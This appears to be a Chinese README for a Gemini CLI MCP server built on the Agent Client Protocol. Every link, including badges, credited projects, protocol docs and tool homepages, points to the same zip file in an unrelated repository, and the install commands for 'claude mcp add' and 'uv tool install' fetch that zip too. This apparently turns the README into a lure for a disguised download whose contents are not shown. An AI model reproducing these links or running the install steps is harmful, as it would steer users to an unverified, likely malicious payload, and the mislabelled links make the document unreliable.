...
[![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip)
[![MCP Compatible](https://img.shields.io/badge/MCP-Compatible-green.svg)](https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip)
[![ACP v1](https://img.shields.io/badge/ACP-v1-orange.svg)](https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip)
...
2025 年 8 月我就用 FastMCP 封装过 Gemini CLI 的 MCP，能通信但体验不佳。后来在论坛上看到 [GuDaStudio/geminimcp](https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip)（[原帖](https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip)），思路类似，感谢分享。

用了一段时间孙佬的 MCP 后，发现每次调用都要等挺久，翻了下源码才知道它底层是 `gemini --prompt -o stream-json`——每次请求都 spawn 一个新进程、解析文本输出，冷启动开销避不开。

然后某天跑 `gemini --help` 的时候，注意到有个 `--acp` 标志。查了一下发现这是 Gemini CLI 内置的 [Agent Client Protocol](https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip)——一套完整的 JSON-RPC 协议，支持有状态会话、流式响应、权限管理和多模态输入。
...
- **Python 3.12+** + [FastMCP](https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip) (MCP server 框架)
- **[uv](https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip)** — 打包、依赖管理、`uv tool install` 一键部署
- **Pydantic** — 参数验证和类型注解
...
```bash
claude mcp add gemini -s user --transport stdio -- uvx --from git+https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip geminimcp
```
...
```bash
uv tool install --reinstall --force --from git+https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip geminimcp
```
...
[![Star History Chart](https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip)](https://github.com/Trixpolyglot933/gemini_mcp/raw/refs/heads/main/.claude/rules/gemini-mcp-1.6-beta.3.zip)
